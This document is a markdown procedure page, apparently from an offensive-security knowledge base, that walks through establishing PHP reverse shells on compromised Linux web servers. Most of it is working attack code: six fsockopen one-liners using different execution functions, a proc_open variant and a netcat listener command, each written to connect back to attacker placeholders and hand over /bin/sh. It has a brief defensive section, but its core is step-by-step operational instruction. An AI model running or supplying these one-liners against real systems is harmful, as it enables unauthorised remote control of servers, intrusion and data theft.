---
id: 103d3413-8f8a-467e-ba22-a80d391a1910
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.291707+00:00'
updated_at: '2023-04-10T20:25:26.682983+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
sub_techniques: []
tags:
  - '[[tags/PHP]]'
  - '[[tags/Reverse Shell]]'
  - '[[tags/Reverse Shell Cheat Sheet]]'
commands: []
platforms:
  - Linux
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Establish-PHP-Reverse-Shell

## Summary

This procedure demonstrates how to establish a reverse shell on a compromised system using PHP one-liners. It allows an attacker to gain remote command execution by connecting from the target back to a listener on the attacker's machine, typically after initial access via a web vulnerability or RCE.

## Description

The PHP Reverse Shell technique leverages PHP's networking and execution functions to create a TCP connection from the target system to the attacker's listener, redirecting stdin, stdout, and stderr to enable interactive shell access. This is particularly useful in web environments where PHP is available, such as after exploiting a file upload vulnerability or command injection. The procedure covers multiple variations using fsockopen for socket creation combined with different PHP execution functions (exec, shell_exec, etc.), as well as a proc_open method for more robust process handling. Success provides full shell access, enabling further post-exploitation activities like persistence or data exfiltration. This maps to MITRE ATT&CK for remote access in command and control scenarios.

## Requirements

1. Access to a vulnerable system with PHP installed (CLI or web server execution capability, e.g., via RCE or file upload).
2. Knowledge of the attacker's IP address and listening port (e.g., set up with netcat: `nc -lvnp <port>`).
3. Target system running a compatible shell like `/bin/sh` (common on Linux/Unix).
4. Network connectivity from target to attacker (outbound TCP allowed).

## Defense

Defensive measures and detection strategies:

- Implement web application firewalls (WAF) to block suspicious PHP executions or file uploads.
- Monitor for anomalous outbound network connections to unexpected IPs/ports from web servers.
- Enable PHP logging and restrict dangerous functions (e.g., disable exec, shell_exec via php.ini).
- Use endpoint detection tools to alert on PHP processes spawning shells or unusual child processes.
- Segment networks to limit lateral movement post-compromise.

## Objectives

1. Establish a TCP connection from the target to the attacker's listener.
2. Redirect shell I/O to enable remote command execution.
3. Verify interactive shell access for post-exploitation.

## Instructions

### Step 1: Set Up Listener and Execute Fsockopen Variations

**Context**: Begin by starting a listener on your machine. Then, on the target, execute one of the fsockopen-based one-liners to create a socket and spawn a shell. These variations use different PHP functions to execute the shell command, providing options if one is blocked by security controls. Choose based on what's permitted in the target's PHP configuration.

**Code** ([[codes/PHP-Fsockopen-Reverse-Shell-Variations]]):

```bash
php -r '$sock=fsockopen("$_ATTACKER_IP",$_ATTACKER_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$_ATTACKER_IP",$_ATTACKER_PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$_ATTACKER_IP",$_ATTACKER_PORT);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("$_ATTACKER_IP",$_ATTACKER_PORT);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$_ATTACKER_IP",$_ATTACKER_PORT);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$_ATTACKER_IP",$_ATTACKER_PORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

> These one-liners open a socket to the attacker, duplicate file descriptors (3 for the socket), and execute `/bin/sh` with I/O redirection for bidirectional communication. If successful, your listener will receive a connection and present a shell prompt. Test variations if the first fails due to function restrictions.

### Step 2: Execute Proc_Open Variation

**Context**: If fsockopen methods are unsuitable or blocked, use proc_open for direct process stream handling. This creates a more stable shell by explicitly mapping streams to the socket, useful for persistent sessions.

**Code** ([[codes/PHP-Proc-Open-Reverse-Shell]]):

```bash
php -r '$sock=fsockopen("$_ATTACKER_IP",$_ATTACKER_PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

> This opens a socket, then uses proc_open to launch `/bin/sh -i` with stdin/stdout/stderr piped to the socket streams via the $pipes array. It provides cleaner I/O handling than redirection tricks. On success, the listener gains an interactive shell; the process remains open until killed.

## Expected Output

Successful execution results in an incoming connection on the attacker's listener (e.g., `nc -lvnp 4242`), followed by a shell prompt like `$` or `#`. Commands sent from the attacker (e.g., `whoami`, `pwd`) execute on the target and return output through the connection. Failure indicators include no connection, PHP errors (e.g., function disabled), or connection drops without shell interactivity.
